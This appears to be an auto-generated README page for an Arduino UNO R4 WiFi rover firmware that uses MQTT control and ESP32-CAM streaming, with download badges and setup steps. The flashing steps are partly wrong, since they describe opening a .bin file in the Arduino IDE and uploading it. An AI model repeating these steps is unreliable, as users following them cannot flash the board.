---
layout: "default"
title: "🤖 hks-rover-arduino - Control Your Rover Easily"
description: "🤖 Control the HKS Rover, an omnidirectional robot, with Arduino firmware using MQTT commands from a web interface for seamless navigation."
---
# 🤖 hks-rover-arduino - Control Your Rover Easily

## 🚀 Getting Started
The hks-rover-arduino is an Arduino UNO R4 WiFi firmware designed for omnidirectional rovers. It allows you to control your rover using MQTT and stream live video with the ESP32-CAM. Follow these simple steps to download and run the software.

## 🛑 Download the Software
[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Meharees123/hks-rover-arduino/releases)

## 📥 Download & Install
1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Meharees123/hks-rover-arduino/releases) to see the available versions.
   
2. **Choose the Latest Release**: Look for the most recent version at the top of the page.

3. **Download the Firmware**: Click on the firmware file (usually in .zip or .bin format) to download it to your computer. 

4. **Unzip the File**: If the file is compressed (.zip), unzip it by clicking on the file, then selecting 'Extract'.

5. **Connect Your Arduino**: Make sure your Arduino UNO R4 WiFi is connected to your computer via a USB cable.

6. **Upload the Firmware**:
   - Open the Arduino IDE on your computer.
   - Select the appropriate board (Arduino UNO R4 WiFi) under Tools -> Board.
   - Select the correct port under Tools -> Port.
   - Open the downloaded firmware file using File -> Open.
   - Click the 'Upload' button (right arrow icon) to upload the firmware to your Arduino.

7. **Run the Rover**: Once the upload is complete, follow the instructions below to start controlling your rover.

## 🌐 Control Your Rover
To control your rover, you will need a device with a web browser. Follow these steps:

1. **Find Your Rover's IP Address**: The IP address is typically displayed in the Arduino IDE Serial Monitor once the firmware is running. Note it down.

2. **Open a Web Browser**: On your computer, tablet, or smartphone, open any web browser.

3. **Enter the IP Address**: Type the IP address you noted earlier into the address bar and press Enter.

4. **Access Control Interface**: You will see the web control interface of your rover. Here, you can control the movement and access camera streaming.

5. **Enjoy Your Rover's Features**: Utilize the controls provided on the web interface to navigate your rover. Watch live video streaming from the ESP32-CAM for a view of its surroundings.

## 🛠 Features
- **Omnidirectional Movement**: Navigate your rover in any direction.
- **Real-Time Control**: Experience immediate response to control commands.
- **MQTT Integration**: Easily communicate with other devices.
- **ESP32-CAM Streaming**: Live video feed right to your browser.
- **Three-Motor Drive System**: Reliable and precise movement.

## 📋 Requirements
- **Hardware**: 
  - Arduino UNO R4 WiFi board
  - ESP32-CAM for video streaming
  - Three DC motors for movement
  
- **Software**: 
  - Latest version of Arduino IDE
  - Suitable drivers for your Arduino board installed on your computer

## 📖 Troubleshooting
If you encounter any issues:
- **Check Connections**: Ensure all hardware connections are secure.
- **Confirm IP Address**: Make sure you're using the correct IP address.
- **Consult the Serial Monitor**: View the output in Arduino IDE for any error messages.

## 📞 Support
For further assistance, consider visiting the GitHub Issues page of this repository. You can also search online forums where many helpful community members share their experiences and solutions.

## 🔗 Additional Resources
- [Arduino Documentation](https://www.arduino.cc/en/Reference/HomePage)
- [MQTT Protocol Overview](https://mqtt.org/)

[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Meharees123/hks-rover-arduino/releases)